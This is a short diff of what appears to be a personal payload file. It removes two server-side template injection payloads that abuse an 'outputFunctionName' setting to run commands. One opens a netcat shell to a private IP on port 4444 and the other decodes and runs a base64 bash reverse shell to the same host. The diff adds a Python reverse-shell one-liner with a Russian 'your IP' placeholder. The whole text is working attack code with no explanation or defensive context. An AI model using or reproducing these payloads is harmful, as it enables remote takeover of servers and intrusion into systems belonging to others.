@@ -1,2 +1,1 @@
-&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('nc 192.168.134.88 4444 -e sh');s
-name=admin&password=admin&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNC44OC80NDQ0IDA+JjE= | base64 -d | bash');s
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ТВОЙ_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' #
